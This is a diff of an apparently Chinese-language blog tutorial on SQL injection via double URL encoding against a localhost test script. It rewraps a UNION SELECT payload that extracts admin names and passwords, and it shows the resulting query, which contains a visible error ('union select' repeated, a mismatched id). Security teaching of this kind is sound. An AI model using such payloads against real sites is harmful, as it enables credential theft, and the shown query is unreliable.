@@ -249,7 +249,10 @@
 <pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> news <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token string">'1\''</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>输入<code>http://localhost/sqltest/urldecode.php?id=1%2527</code>，发现如下图的报错：</p>
 <p>这种报错在安全测试人员眼里就是注入的标志。进一步观察数据库，发现除了<code>news</code>表外还有个<code>admin</code>表，我们可以构造获取管理员账户密码的语句:</p>
-<pre><code>http://localhost/sqltest/urldecode.php?id=1%2527 union select 1,2,concat(name,0x23,pass) from admin%23</code></pre><p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g182mahvjdj30hs02dmx0.jpg" alt></p>
+<blockquote>
+<p><a href="http://localhost/sqltest/urldecode.php?id=1%2527" target="_blank" rel="noopener">http://localhost/sqltest/urldecode.php?id=1%2527</a> union select 1,2,concat(name,0x23,pass) from admin%23</p>
+</blockquote>
+<p><img src="https://ww1.sinaimg.cn/large/006Fzy5igy1g182mahvjdj30hs02dmx0.jpg" alt></p>
 <p>对应执行的<code>sql</code>语句：</p>
 <pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">SELECT</span>  SQL_CALC_FOUND_ROWS  <span class="token operator">*</span>  <span class="token keyword">FROM</span> news <span class="token keyword">WHERE</span> id <span class="token operator">=</span>  <span class="token string">'-1'</span> <span class="token keyword">union</span>  <span class="token keyword">select</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">,</span>pass<span class="token punctuation">)</span> <span class="token keyword">from</span> admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 </section>
